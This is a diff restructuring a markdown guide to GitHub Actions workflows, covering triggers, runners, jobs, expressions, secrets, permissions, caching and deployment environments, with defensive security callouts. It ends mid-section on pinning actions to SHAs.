@@ -308,7 +308,7 @@ tags:
 > > This changes execution shape, state reuse, or deployment behavior. Misconfiguring it tends to create expensive failures that are visible only after the workflow starts.
 
 
-## Conceptual Model
+## How workflow execution moves from events to steps
 
 GitHub Actions executes automated processes in response to repository events. The execution flows through four levels: **event → workflow → job → step**.
 
@@ -327,32 +327,42 @@ GitHub Actions executes automated processes in response to repository events. Th
 }}}%%
 flowchart TB
     subgraph Event["Repository Event"]
+        EPAD[" "]
         E1["push to main"]
         E2["pull_request opened"]
         E3["schedule (cron)"]
         E4["workflow_dispatch (manual)"]
+        EPAD ~~~ E1
+        EPAD ~~~ E2
+        EPAD ~~~ E3
+        EPAD ~~~ E4
     end
 
     subgraph Workflow["Workflow (.github/workflows/*.yml)"]
-        direction LR
+        WPAD[" "]
         ON["on: trigger filter"]
         PERM["permissions: GITHUB_TOKEN scope"]
         ENV["env: workflow-level variables"]
         CONC["concurrency: group + cancel"]
+        WPAD ~~~ ON
     end
 
     subgraph Jobs["Jobs (parallel by default)"]
-        direction LR
+        JPAD[" "]
         J1["Job A: lint<br/>runs-on: ubuntu-latest"]
         J2["Job B: test<br/>needs: lint"]
         J3["Job C: deploy<br/>environment: production"]
+        JPAD ~~~ J1
+        JPAD ~~~ J2
+        JPAD ~~~ J3
     end
 
     subgraph Steps["Steps (sequential in a job)"]
-        direction TB
+        SPAD[" "]
         S1["uses: actions/checkout@v4"]
         S2["run: ruff check ."]
         S3["run: echo val >> GITHUB_OUTPUT"]
+        SPAD ~~~ S1
     end
 
     E1 & E2 & E3 & E4 --> ON
@@ -364,11 +374,15 @@ flowchart TB
     style Workflow fill:#292e42,stroke:#565f89,color:#c0caf5
     style Jobs fill:#24283b,stroke:#565f89,color:#c0caf5
     style Steps fill:#292e42,stroke:#565f89,color:#c0caf5
+    style EPAD fill:transparent,stroke:transparent,color:transparent
+    style WPAD fill:transparent,stroke:transparent,color:transparent
+    style JPAD fill:transparent,stroke:transparent,color:transparent
+    style SPAD fill:transparent,stroke:transparent,color:transparent
 ```
 
 *The execution model: a repository event matches a workflow's `on:` trigger, which spawns a workflow run. The run creates jobs, each on its own runner VM. Steps within a job execute sequentially, sharing the runner's filesystem and environment. Jobs run in parallel by default unless ordered with `needs:`.*
 
-### GitHub Actions | conceptual model | data flow
+### conceptual model | data flow
 
 Data moves between steps, jobs, and workflows through specific channels:
 
@@ -383,7 +397,7 @@ Data moves between steps, jobs, and workflows through specific channels:
 | Cache | Job → future runs | `actions/cache` | `actions/cache` (restore) | Yes (across runs) |
 | `GITHUB_STEP_SUMMARY` | Step → run page | `echo "md" >> $GITHUB_STEP_SUMMARY` | GitHub UI run summary | N/A (display only) |
 
-### GitHub Actions | conceptual model | evaluation order
+### conceptual model | evaluation order
 
 Expressions (`${{ }}`) are evaluated by GitHub **at workflow-processing time**, before any shell command runs. This distinction is critical:
 
@@ -393,22 +407,32 @@ Expressions (`${{ }}`) are evaluated by GitHub **at workflow-processing time**, 
 
 This means `${{ github.sha }}` is a string literal by the time bash sees it — it is not a shell variable. Conversely, `$GITHUB_SHA` is a real environment variable available at shell runtime.
 
-> [!warning] Expression evaluation is not shell evaluation
+> [!warning] Workflow expressions and shell commands run in different phases
 >
-> `${{ }}` expressions are resolved before the shell starts. You cannot use shell logic to construct expression values. `if: ${{ env.MY_VAR == 'true' }}` reads `env.MY_VAR` from the context object, not from the shell environment. If `MY_VAR` was set via `GITHUB_ENV` in a previous step, the `env` context will have it — but if set via `export` in the same step, it will not.
-
-> [!success] Use the right channel for the right scope
+> GitHub resolves expressions while processing the workflow YAML, then the runner
+> executes shell commands with those resolved values already substituted. Safe
+> workflow design depends on knowing which channel is evaluated when.
 >
-> - Need a value in the next step of the same job? → `GITHUB_ENV`
-> - Need a value in a different job? → `GITHUB_OUTPUT` + `jobs.<id>.outputs`
-> - Need a value across workflow runs? → Artifacts or cache
-> - Need a value from GitHub Settings? → `vars` (plaintext) or `secrets` (encrypted)
+> > [!danger] Expression evaluation is not shell evaluation
+> >
+> > `${{ }}` expressions are resolved before the shell starts. You cannot use
+> > shell logic to construct expression values. `if: ${{ env.MY_VAR == 'true' }}`
+> > reads `env.MY_VAR` from the context object, not from the shell environment.
+> > If `MY_VAR` was set via `GITHUB_ENV` in a previous step, the `env` context
+> > will have it — but if set via `export` in the same step, it will not.
+>
+> > [!success] Use the right channel for the right scope
+> >
+> > - Need a value in the next step of the same job? → `GITHUB_ENV`
+> > - Need a value in a different job? → `GITHUB_OUTPUT` + `jobs.<id>.outputs`
+> > - Need a value across workflow runs? → Artifacts or cache
+> > - Need a value from GitHub Settings? → `vars` (plaintext) or `secrets` (encrypted)
 
-## Workflow File Anatomy
+## How a workflow file is structured
 
 Every workflow lives at `.github/workflows/<name>.yml`. GitHub discovers all YAML files in that directory automatically — no registration step is needed.
 
-### GitHub Actions | workflow | top-level keys
+### workflow | top-level keys
 
 | Key | Required | Purpose |
 |-----|----------|---------|
@@ -421,7 +445,7 @@ Every workflow lives at `.github/workflows/<name>.yml`. GitHub discovers all YAM
 | `defaults` | No | Default `run` shell and `working-directory` for all steps |
 | `jobs` | Yes | Map of jobs to execute — each job runs on its own runner |
 
-### GitHub Actions | workflow | defaults and shell selection
+### workflow | defaults and shell selection
 
 Set `defaults.run` at workflow scope when most steps share the same shell or working directory. It becomes relevant in any workflow where you want predictable shell behavior without repeating `shell:` and `working-directory:` on every step. The setting applies to `run:` steps only and can still be overridden locally when a step needs different execution semantics.
 > [!info]- Workflow YAML breakdown
@@ -492,11 +516,11 @@ Individual steps can override defaults.run
 | `cmd` | Windows | `cmd /D /E:ON /V:OFF /S /C "CALL "{0}""` | Windows Command Prompt |
 | `powershell` | Windows | `powershell -command ". '{0}'"` | Windows PowerShell (5.x) |
 
-## Triggers
+## Which events and filters can start a workflow
 
 The `on:` key defines which repository events activate the workflow. Each trigger type can be filtered by branch, path, tag, or activity type. Multiple triggers can be combined — the workflow runs when any of them fires.
 
-### GitHub Actions | triggers | push event
+### triggers | push event
 
 Use this pattern when continuous integration — validate code quality and tests on every push.
 **Trust boundary:** Runs code from the pushed commit. Secrets are available.
@@ -559,7 +583,7 @@ Commit message: Add GitHub Actions demo workflows for Elysium vault chapter 10
 | `paths` | `['src/**', '*.py']` | Trigger only if changed files match |
 | `paths-ignore` | `['docs/**', '*.md']` | Trigger unless only these files changed |
 
-### GitHub Actions | triggers | pull_request event
+### triggers | pull_request event
 
 Use this pattern when CI validation on pull requests — lint, test, and check before merge.
 **Trust boundary:** For PRs from the same repo, runs against a **temporary merge commit** (the PR head merged into the base). Secrets are available. For fork PRs, secrets are NOT available.
@@ -619,22 +643,32 @@ IMPORTANT: This workflow runs against the MERGE commit
 Secrets are available ONLY for PRs from the same repo, not forks.
 ```
 
-### GitHub Actions | triggers | pull_request_target event
+### triggers | pull_request_target event
 
 Use this pattern when processing fork PRs that need write access or secrets — labels, comments, deployments.
 **Trust boundary:** Runs workflow code from the **base branch** (not the PR head), with full secrets and write permissions.
 
-> [!danger] pull_request_target runs untrusted code with full privileges
+> [!warning] Trigger choice defines the trust boundary for pull request automation
 >
-> If you check out the PR head (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`) and then run code from it (tests, scripts, build commands), you are executing arbitrary code from an untrusted fork with full access to secrets and write permissions. This is a known attack vector.
-
-> [!success] Safe pattern for pull_request_target
+> `pull_request_target` is useful because it runs with base-branch privileges, but
+> that same privilege model becomes dangerous the moment untrusted PR code is
+> executed inside the job.
 >
-> Use `pull_request_target` only for metadata operations (labeling, commenting). If you must build the PR code, use a two-workflow pattern:
-> 1. A `pull_request` workflow that builds and tests (no secrets needed).
-> 2. A `workflow_run` workflow triggered by the completion of #1, which runs on the base branch with secrets.
+> > [!danger] `pull_request_target` can execute untrusted code with full privileges
+> >
+> > If you check out the PR head (`actions/checkout` with
+> > `ref: ${{ github.event.pull_request.head.sha }}`) and then run code from it
+> > (tests, scripts, build commands), you are executing arbitrary code from an
+> > untrusted fork with full access to secrets and write permissions. This is a
+> > known attack vector.
+>
+> > [!success] Restrict `pull_request_target` to metadata or split the workflow
+> >
+> > - Use `pull_request_target` only for metadata operations such as labeling or commenting.
+> > - Run builds and tests for forked PR code under `pull_request`, where secrets are unavailable.
+> > - If a privileged follow-up is required, trigger a separate `workflow_run` workflow on the base branch after the unprivileged workflow completes.
 
-### GitHub Actions | triggers | schedule
+### triggers | schedule
 
 Use this pattern when recurring tasks — nightly builds, weekly reports, periodic cleanup, SLA monitoring.
 **Trust boundary:** Always runs on the **default branch** (main). Full secrets available.
@@ -684,15 +718,26 @@ Schedule notes:
 Schedule expression: 45 * * * *
 ```
 
-> [!warning] Cron timing is not deterministic
+> [!warning] Scheduled workflows are best-effort timers, not precise schedulers
 >
-> GitHub does not guarantee exact cron execution times. Under high load, scheduled runs may be delayed by 15+ minutes. If the repo is inactive for 60+ days, scheduled workflows are automatically disabled. Do not rely on cron for time-sensitive operations — use an external scheduler (e.g., Cloud Scheduler) triggering `repository_dispatch` if you need precise timing.
-
-> [!success] Monitoring cron reliability
+> GitHub cron is suitable for recurring maintenance and reporting, but it is not
+> a hard real-time scheduling system. The workflow needs an operational fallback
+> when timing matters.
 >
-> Add a `workflow_dispatch` trigger to every scheduled workflow. This lets you test the workflow manually and verify it works before waiting for the next cron window.
+> > [!danger] Cron timing is not deterministic
+> >
+> > GitHub does not guarantee exact cron execution times. Under high load,
+> > scheduled runs may be delayed by 15+ minutes. If the repo is inactive for
+> > 60+ days, scheduled workflows are automatically disabled. Do not rely on cron
+> > for time-sensitive operations.
+>
+> > [!success] Add an explicit testing and reliability path
+> >
+> > - Add `workflow_dispatch` to every scheduled workflow so the logic can be tested on demand.
+> > - Monitor for missed or delayed runs rather than assuming perfect cadence.
+> > - Use an external scheduler such as Cloud Scheduler plus `repository_dispatch` when exact timing matters.
 
-### GitHub Actions | triggers | workflow_dispatch
+### triggers | workflow_dispatch
 
 Use this pattern when manual triggers — ad-hoc deploys, backfills, on-demand reports, debugging.
 **Trust boundary:** Runs on the branch selected in the UI or API call. Full secrets available.
@@ -782,7 +827,7 @@ Custom message: Hello from workflow_dispatch
 DRY RUN MODE — no changes will be made
 ```
 
-### GitHub Actions | triggers | repository_dispatch
+### triggers | repository_dispatch
 
 Use this pattern when external system integration — triggering workflows from webhooks, APIs, other repos, or CI/CD orchestrators.
 **Trust boundary:** Always runs on the **default branch** (main). Full secrets available.
@@ -828,7 +873,7 @@ Use cases:
   - Webhook-driven pipelines
 ```
 
-### GitHub Actions | triggers | release
+### triggers | release
 
 Use this pattern when release-driven deployment — trigger a deploy, publish, or changelog generation when a GitHub release is created.
 **Trust boundary:** Runs on the tag/branch associated with the release. Full secrets available.
@@ -841,7 +886,7 @@ on:
 
 The `github.event.release` object contains the tag name, release name, body, and whether it's a pre-release. Common pattern: `if: ${{ !github.event.release.prerelease }}` to skip pre-releases.
 
-### GitHub Actions | triggers | workflow_call (reusable workflow)
+### triggers | workflow_call (reusable workflow)
 
 Use this pattern when sharing workflow logic across repositories or within a monorepo. The called workflow receives inputs and can return outputs.
 **Trust boundary:** Inherits the caller's `GITHUB_TOKEN` permissions. Secrets must be explicitly passed.
@@ -937,7 +982,7 @@ Deployed to https://staging.example.com
 Deploy URL from reusable workflow: https://staging.example.com
 ```
 
-### GitHub Actions | triggers | workflow_run
+### triggers | workflow_run
 
 Use this pattern when chaining workflows — run a deployment after CI passes, aggregate results from fork PR workflows, or post-process artifacts.
 **Trust boundary:** Always runs on the **default branch** (main), regardless of the triggering workflow's branch. Full secrets available.
@@ -993,7 +1038,7 @@ It does NOT run the code from the triggering branch.
 This has security implications — the called workflow is trusted code.
 ```
 
-### GitHub Actions | triggers | merge_group
+### triggers | merge_group
 
 Use this pattern when repos with merge queues enabled. The `merge_group` event fires when a PR is added to the merge queue, running checks against the tentative merge result.
 
@@ -1003,35 +1048,49 @@ on:
     types: [checks_requested]
 ```
 
-> [!warning] Missing merge_group trigger blocks the merge queue
+> [!warning] Merge queue validation is a separate event path from ordinary pull requests
 >
-> If you enable merge queues on a branch but your required status checks only trigger on `pull_request`, they will never run for the merge queue entries and the queue will be permanently stuck.
-
-> [!success] Add merge_group alongside pull_request
+> Required checks have to trigger for the synthetic merge-queue event, not just
+> for the original PR, or the queue cannot advance.
 >
-> ```yaml
-> on:
->   pull_request:
->     branches: [main]
->   merge_group:
-> ```
+> > [!danger] Missing `merge_group` leaves the merge queue permanently stuck
+> >
+> > If you enable merge queues on a branch but your required status checks only
+> > trigger on `pull_request`, they will never run for merge queue entries.
+>
+> > [!success] Add `merge_group` alongside `pull_request`
+> >
+> > ```yaml
+> > on:
+> >   pull_request:
+> >     branches: [main]
+> >   merge_group:
+> > ```
 
-### GitHub Actions | triggers | issue_comment
+### triggers | issue_comment
 
 Use this pattern when slash-command bots — `/deploy`, `/rerun`, `/approve` comments that trigger workflows.
 **Trust boundary:** Fires for comments on both issues and PRs. **Runs on the default branch** with full secrets.
 
-> [!danger] issue_comment runs on the default branch, not the PR branch
+> [!warning] Comment-driven automation runs with default-branch trust, not PR-branch trust
 >
-> If an issue_comment workflow checks out the PR branch and runs code from it, any user who can comment on an issue can execute arbitrary code with full repo secrets. This is equivalent to the `pull_request_target` attack.
-
-> [!success] Safe pattern for issue_comment
+> Slash-command workflows are convenient, but they are privileged control paths.
+> The workflow must verify the actor and avoid turning comments into a path for
+> executing untrusted branch code with secrets.
 >
-> 1. Check that the commenter has write access: `if: github.event.comment.author_association == 'MEMBER'`
-> 2. Only trigger on specific comment bodies: `if: contains(github.event.comment.body, '/deploy')`
-> 3. Never check out untrusted code with secrets available
+> > [!danger] `issue_comment` runs on the default branch, not the PR branch
+> >
+> > If an `issue_comment` workflow checks out the PR branch and runs code from it,
+> > any user who can comment on an issue can execute arbitrary code with full repo
+> > secrets. This is equivalent to the `pull_request_target` attack.
+>
+> > [!success] Gate comment workflows tightly
+> >
+> > - Check that the commenter has write access with `author_association`.
+> > - Trigger only on narrowly scoped command text such as `/deploy`.
+> > - Never check out or execute untrusted PR code while secrets are available.
 
-### GitHub Actions | triggers | multiple triggers
+### triggers | multiple triggers
 
 Combine multiple triggers — the workflow runs when **any** of them fires.
 
@@ -1048,11 +1107,11 @@ on:
 
 Use `github.event_name` to branch logic based on which trigger fired.
 
-## Runners
+## Where jobs run and how runner types differ
 
 Runners are the servers that execute workflow jobs. Each job runs on a fresh runner instance.
 
-### GitHub Actions | runners | GitHub-hosted runners
+### runners | GitHub-hosted runners
 
 GitHub provides managed, ephemeral VMs with pre-installed tools. The VM is created fresh for each job and destroyed after the job completes.
 
@@ -1062,22 +1121,30 @@ GitHub provides managed, ephemeral VMs with pre-installed tools. The VM is creat
 | `windows-latest` | Windows Server 2022 | 4 | 16 GB | 14 GB SSD | 2× Linux rate |
 | `macos-latest` | macOS 14 (Sonoma) | 3 (M1) | 7 GB | 14 GB SSD | 10× Linux rate |
 
-### GitHub Actions | runners | self-hosted runners
+### runners | self-hosted runners
 
 Use this pattern when GPU workloads, private network access, compliance requirements, or cost savings at scale.
 
-> [!danger] Self-hosted runners without isolation are a security risk
+> [!warning] Owning the runner means owning the runner attack surface
 >
-> Unlike GitHub-hosted runners, self-hosted runners are **not ephemeral by default**. A malicious workflow can persist files, install backdoors, or exfiltrate credentials. Any fork PR can run code on your self-hosted runner if not restricted.
-
-> [!success] Secure self-hosted runner patterns
+> Self-hosted runners trade convenience and network access for a much larger
+> persistence and isolation problem than GitHub-hosted ephemeral machines.
 >
-> - Run self-hosted runners in ephemeral/JIT mode (auto-register, run one job, auto-deregister)
-> - Restrict runner groups to specific repositories
-> - Use container-based isolation (Docker-in-Docker or Kubernetes with `actions-runner-controller`)
-> - Never expose self-hosted runners to public repos with fork PRs enabled
+> > [!danger] Self-hosted runners without isolation are a security risk
+> >
+> > Unlike GitHub-hosted runners, self-hosted runners are **not ephemeral by
+> > default**. A malicious workflow can persist files, install backdoors, or
+> > exfiltrate credentials. Any fork PR can run code on your self-hosted runner
+> > if not restricted.
+>
+> > [!success] Use hardened self-hosted runner patterns
+> >
+> > - Run self-hosted runners in ephemeral or JIT mode.
+> > - Restrict runner groups to specific repositories.
+> > - Use container or Kubernetes isolation around job execution.
+> > - Never expose self-hosted runners to public repos with fork PRs enabled.
 
-### GitHub Actions | runners | larger and ephemeral runners
+### runners | larger and ephemeral runners
 
 GitHub offers larger runner sizes for performance-intensive workloads. Available on GitHub Team and Enterprise plans.
 
@@ -1088,11 +1155,11 @@ GitHub offers larger runner sizes for performance-intensive workloads. Available
 | `ubuntu-latest-16-cores` | 16 | 64 GB | Docker builds, ML training |
 | `ubuntu-latest-32-cores` | 32 | 128 GB | Large monorepo builds |
 
-## Jobs
+## How jobs define parallel and dependent work
 
 Jobs are the primary units of work. Each job runs on a fresh runner VM.
 
-### GitHub Actions | jobs | sequential dependencies (needs)
+### jobs | sequential dependencies (needs)
 
 Use `needs:` to create job dependencies. A job only starts after all jobs listed in `needs:` complete successfully.
 
@@ -1118,7 +1185,7 @@ jobs:
 
 Without `needs:`, all three jobs would run in parallel.
 
-### GitHub Actions | jobs | matrix strategy
+### jobs | matrix strategy
 
 Use a matrix when the same job must run across multiple Python versions, operating systems, or configuration variants. One job definition expands into multiple parallel job instances, each with a different parameter combination.
 
@@ -1198,7 +1265,7 @@ Python 3.12.13
 | `include` | list | — | Add combinations or properties |
 | `exclude` | list | — | Remove combinations |
 
-### GitHub Actions | jobs | job outputs
+### jobs | job outputs
 
 Declare outputs at the job level to pass data to downstream jobs via `needs.<job>.outputs.<name>`.
 
@@ -1220,7 +1287,7 @@ jobs:
       - run: echo "Version: ${{ needs.producer.outputs.version }}"
 ```
 
-### GitHub Actions | jobs | job containers and service containers
+### jobs | job containers and service containers
 
 Use this pattern when integration testing with real databases, message queues, or other services. The operational goal is to attach Docker containers alongside the job runner for end-to-end testing without mocks.
 
@@ -1302,11 +1369,11 @@ Service container provides a real PostgreSQL instance.
 No mocking needed — this is a true integration test.
 ```
 
-## Steps
+## How steps execute inside each job
 
 Steps are the individual tasks within a job. They execute sequentially and share the runner's filesystem.
 
-### GitHub Actions | steps | uses (actions)
+### steps | uses (actions)
 
 The `uses:` key references a reusable action. Actions are pulled from GitHub repos, Docker images, or local paths.
 
@@ -1327,7 +1394,7 @@ steps:
   - uses: ./.github/actions/my-custom-action
 ```
 
-### GitHub Actions | steps | continue-on-error semantics
+### steps | continue-on-error semantics
 
 Use `continue-on-error` when a step may fail without invalidating the entire job, such as flaky diagnostics, optional checks, or best-effort notifications. The flag turns that step failure into a soft success while still preserving the failure details in the logs and UI.
 
@@ -1377,13 +1444,21 @@ continue-on-error converted the failure.
 Running cleanup because the flaky step failed.
 ```
 
-> [!warning] Job-level continue-on-error hides real failures
+> [!warning] Failure masking should stay narrow and explicit
 >
-> Setting `continue-on-error: true` at the **job** level makes the overall workflow show as "success" even when the job fails. Downstream jobs via `needs:` will see the job result as `success`. This masks genuine failures and breaks CI signal.
-
-> [!success] Use step-level, not job-level
+> `continue-on-error` is useful for experiments and cleanup logic, but if it is
+> applied too broadly it destroys the signal that CI is meant to preserve.
 >
-> Apply `continue-on-error` to individual steps, not entire jobs. Check `steps.<id>.outcome` in a subsequent step to handle the failure explicitly.
+> > [!danger] Job-level `continue-on-error` hides real failures
+> >
+> > Setting `continue-on-error: true` at the **job** level makes the overall
+> > workflow show as success even when the job fails. Downstream jobs via
+> > `needs:` will also see the result as `success`.
+>
+> > [!success] Apply error tolerance at the step boundary
+> >
+> > Use `continue-on-error` on individual steps, not entire jobs. Then inspect
+> > `steps.<id>.outcome` in a later step to handle the failure explicitly.
 
 | Property | `outcome` | `conclusion` |
 |----------|-----------|--------------|
@@ -1392,9 +1467,9 @@ Running cleanup because the flaky step failed.
 | When continue-on-error is false | `failure` | `failure` |
 | Use for conditionals | `${{ steps.<id>.outcome == 'failure' }}` | N/A |
 
-## Expressions and Contexts
+## How expressions and contexts are evaluated
 
-### GitHub Actions | expressions | syntax and operators
+### expressions | syntax and operators
 
 Expressions use the `${{ }}` syntax and are evaluated at workflow-processing time.
 
@@ -1425,7 +1500,7 @@ GOTCHA: In expressions, 0 and '' are falsy.
 Expression evaluation happens BEFORE shell execution.
 ```
 
-### GitHub Actions | expressions | status functions
+### expressions | status functions
 
 | Function | Behavior | Implicit in `if:`? |
 |----------|----------|-------------------|
@@ -1434,13 +1509,25 @@ Expression evaluation happens BEFORE shell execution.
 | `cancelled()` | True if the workflow was cancelled | No |
 | `always()` | Always true — step runs even after failure or cancellation | No |
 
-### GitHub Actions | expressions | type coercion pitfalls
+### expressions | type coercion pitfalls
 
-> [!warning] Expression types are not shell types
+> [!warning] Expression coercion changes meaning once values cross into shell runtime
 >
-> In expressions, `null` coerces to `''`, `false` coerces to `'false'` (a truthy string in shell), and `0` coerces to `'0'` (also truthy in shell). Always compare explicitly: `if: ${{ inputs.dry_run == true }}` instead of `if: ${{ inputs.dry_run }}`.
+> A value that is falsey in the Actions expression engine may become a non-empty
+> string in the shell, where the truth rules are different.
+>
+> > [!danger] Expression types are not shell types
+> >
+> > In expressions, `null` coerces to `''`, `false` coerces to `'false'` (a
+> > truthy string in shell), and `0` coerces to `'0'` (also truthy in shell).
+>
+> > [!success] Compare expression values explicitly before handing them to the shell
+> >
+> > Write conditions such as `if: ${{ inputs.dry_run == true }}` instead of
+> > relying on implicit truthiness. Treat shell runtime and expression runtime as
+> > separate evaluation systems.
 
-### GitHub Actions | contexts | github, runner, env, steps, needs
+### contexts | github, runner, env, steps, needs
 
 *Dump all major contexts in a single workflow.*
 
@@ -1540,9 +1627,9 @@ show-contexts.outputs.job_result: hello-from-step
 show-contexts.result: success
 ```
 
-## Environment Variables and Outputs
+## How variables and outputs move data through a run
 
-### GitHub Actions | variables | env levels (workflow, job, step)
+### variables | env levels (workflow, job, step)
 
 Environment variables cascade from workflow → job → step, with narrower scopes overriding broader ones.
 
@@ -1560,7 +1647,7 @@ jobs:
         run: echo "$LEVEL"  # Prints: step
 ```
 
-### GitHub Actions | variables | GITHUB_OUTPUT
+### variables | GITHUB_OUTPUT
 
 Use this pattern when passing computed values from one step to another, or from a job to downstream jobs. The operational goal is to replace the deprecated `::set-output` workflow command.
 
@@ -1591,7 +1678,7 @@ Only values declared in jobs.<id>.outputs and written
 to GITHUB_OUTPUT are available via needs.<id>.outputs.
 ```
 
-### GitHub Actions | variables | GITHUB_STEP_SUMMARY
+### variables | GITHUB_STEP_SUMMARY
 
 Use this pattern when generating human-readable reports (test results, build metrics, deployment status) visible on the workflow run page. The operational goal is to write GitHub-flavored markdown to the job summary section.
 
@@ -1607,7 +1694,7 @@ Use this pattern when generating human-readable reports (test results, build met
 
 Maximum size: 1 MiB per step, 1 MiB total per job. Multiple steps can append to the same summary.
 
-### GitHub Actions | variables | default environment variables
+### variables | default environment variables
 
 | Variable | Value |
 |----------|-------|
@@ -1624,9 +1711,9 @@ Maximum size: 1 MiB per step, 1 MiB total per job. Multiple steps can append to 
 | `RUNNER_OS` | `Linux`, `Windows`, or `macOS` |
 | `RUNNER_ARCH` | `X64`, `ARM`, or `ARM64` |
 
-## Secrets and Permissions
+## How secrets and permissions should be scoped
 
-### GitHub Actions | secrets | types and scoping
+### secrets | types and scoping
 
 | Scope | Set via | Precedence | Use case |
 |-------|---------|------------|----------|
@@ -1636,7 +1723,7 @@ Maximum size: 1 MiB per step, 1 MiB total per job. Multiple steps can append to 
 
 Secrets are encrypted at rest and masked in logs. They are not available to fork PRs (with `pull_request` trigger) unless the repo admin explicitly enables it.
 
-### GitHub Actions | secrets | accessing secrets safely
+### secrets | accessing secrets safely
 
 ```yaml
 steps:
@@ -1648,26 +1735,31 @@ steps:
       psql "postgresql://user:${DB_PASSWORD}@host/db"
 ```
 
-> [!danger] Never interpolate secrets directly in shell commands
+> [!warning] Secrets should enter commands through controlled bindings, not YAML interpolation
 >
-> ```yaml
-> # DANGEROUS — secrets in command line are visible in process listings
-> run: curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.example.com
-> ```
-
-> [!success] Always pass secrets through environment variables
+> Template expansion happens before the shell starts, which makes secret-bearing
+> command lines easier to leak in logs, debug output, and process listings.
 >
-> ```yaml
-> env:
->   TOKEN: ${{ secrets.TOKEN }}
-> run: curl -H "Authorization: Bearer $TOKEN" https://api.example.com
-> ```
+> > [!danger] Never interpolate secrets directly in shell commands
+> >
+> > ```yaml
+> > # DANGEROUS — secrets in command line are visible in process listings
+> > run: curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.example.com
+> > ```
+>
+> > [!success] Pass secrets through environment variables
+> >
+> > ```yaml
+> > env:
+> >   TOKEN: ${{ secrets.TOKEN }}
+> > run: curl -H "Authorization: Bearer $TOKEN" https://api.example.com
+> > ```
 
-### GitHub Actions | secrets | GITHUB_TOKEN
+### secrets | GITHUB_TOKEN
 
 The `GITHUB_TOKEN` is automatically created for each workflow run. It authenticates API calls to the GitHub API for the repository.
 
-### GitHub Actions | permissions | permissions block
+### permissions | permissions block
 
 Declare explicit `permissions` in every workflow. The goal is to scope `GITHUB_TOKEN` to only the capabilities the workflow actually needs instead of inheriting a broader default token surface.
 
@@ -1692,17 +1784,27 @@ When you set `permissions:` at the workflow or job level, **all unspecified scop
 | `statuses` | Read commit statuses | Create commit statuses | External CI integration |
 | `security-events` | Read alerts | Upload SARIF | CodeQL, dependency scanning |
 
-> [!danger] Implicit permissions are over-broad
+> [!warning] Token scope should be declared, not inherited
 >
-> Without a `permissions:` block, `GITHUB_TOKEN` receives the repository's default permissions — which for private repos is read/write on most scopes. A compromised action could push code, delete branches, or modify issues.
-
-> [!success] Always set explicit permissions
+> `GITHUB_TOKEN` is part of the workflow attack surface. Least privilege only
+> exists if the workflow states it explicitly.
 >
-> Add `permissions:` at the workflow level. Start with `contents: read` and add only what the workflow needs. Review permissions whenever adding new actions.
+> > [!danger] Implicit permissions are over-broad
+> >
+> > Without a `permissions:` block, `GITHUB_TOKEN` receives the repository's
+> > default permissions. In private repos that can mean read/write access across
+> > many scopes. A compromised action could push code, delete branches, or modify
+> > issues.
+>
+> > [!success] Set explicit permissions on every workflow
+> >
+> > Add `permissions:` at the workflow level. Start with `contents: read` and add
+> > only what the workflow actually needs. Re-review permissions whenever adding
+> > new actions.
 
-## Artifacts and Caching
+## When to use artifacts and when to use caching
 
-### GitHub Actions | artifacts | upload and download
+### artifacts | upload and download
 
 Use this pattern when passing build outputs between jobs, storing test reports, retaining deployment manifests.
 
@@ -1792,7 +1894,7 @@ Manifest contents:
 | `compression-level` | 6 | zlib compression level (0=none, 9=max) |
 | `overwrite` | `false` | Whether to overwrite an existing artifact with the same name |
 
-### GitHub Actions | caching | actions/cache
+### caching | actions/cache
 
 Use this pattern when avoiding repeated downloads of dependencies (pip, npm, Docker layers) across runs. The operational goal is to store and restore a directory tree keyed by a hash of a lockfile.
 
@@ -1860,19 +1962,26 @@ Cache saved with key: pip-Linux-be654b93dbe1ff76cb7cbd515b434dad18ea380de7eb66ca
 | `save-always` | `false` | Save the cache even if the job fails |
 | `lookup-only` | `false` | Check for cache existence without restoring |
 
-> [!warning] Stale or poisoned caches
+> [!warning] Caches trade speed for trust and freshness
 >
-> Caches are scoped to the branch and its ancestors. A cache created on a feature branch is accessible to that branch and its parent (usually main), but not to sibling branches. A poisoned cache (one with tampered dependencies) on main can affect all branches. Caches are evicted after 7 days of no access or when the repo exceeds the 10 GB limit.
-
-> [!success] Defensive caching patterns
+> A cache hit is only beneficial when the contents still match the dependency
+> state and can be trusted as an input to the build.
 >
-> - Always include `hashFiles()` of the lockfile in the cache key — this ensures the cache is invalidated when dependencies change
-> - Use `restore-keys` for partial matches (faster restores when only a few packages changed)
-> - Pin `actions/cache` to a full SHA to prevent supply-chain attacks on the caching mechanism itself
+> > [!danger] Stale or poisoned caches can spread bad state across runs
+> >
+> > Caches are scoped to the branch and its ancestors. A poisoned cache on `main`
+> > can affect many branches, and stale entries persist until eviction or key
+> > invalidation.
+>
+> > [!success] Use defensive caching patterns
+> >
+> > - Include `hashFiles()` of the lockfile in the key so dependency changes invalidate the cache.
+> > - Use `restore-keys` only as controlled fallbacks, not as a substitute for exact invalidation.
+> > - Pin `actions/cache` to a full SHA so the cache mechanism itself is not a mutable dependency.
 
-## Concurrency
+## How concurrency rules control overlapping runs
 
-### GitHub Actions | concurrency | cancel-in-progress
+### concurrency | cancel-in-progress
 
 Use concurrency cancellation when a newer push makes the current in-progress run obsolete and there is no value in finishing the older run.
 
@@ -1904,7 +2013,7 @@ Deploy step 6/6...
 Deployment simulation complete.
 ```
 
-### GitHub Actions | concurrency | serialization
+### concurrency | serialization
 
 For deployments, use concurrency without `cancel-in-progress` to serialize runs (queue instead of cancel):
 
@@ -1914,9 +2023,9 @@ concurrency:
   cancel-in-progress: false
 ```
 
-## Environments
+## How environments gate sensitive deployments
 
-### GitHub Actions | environments | protection rules
+### environments | protection rules
 
 Use this pattern when gating deployments behind human approval, wait timers, or branch restrictions. The operational goal is to prevent accidental production deployments and enforce deployment policies.
 
@@ -2012,22 +2121,30 @@ gh variable set DEMO_REGION -R alp78/git-lab --env staging --body "europe-west1"
 | **Deployment branches** | Restrict which branches can deploy to the environment |
 | **Custom rules** | GitHub App-based custom deployment protection rules |
 
-## Security Fundamentals
+## Which security rules prevent common workflow compromise
 
-### GitHub Actions | security | pinning actions to SHA
+### security | pinning actions to SHA
 
-> [!danger] Mutable tags are a supply-chain risk
+> [!warning] Action references are part of the workflow supply chain
 >
-> `uses: actions/checkout@v4` resolves to whatever commit `v4` currently points to. If the action maintainer's account is compromised, `v4` can be repointed to malicious code. This has happened in real attacks (e.g., the `tj-actions/changed-files` compromise).
-
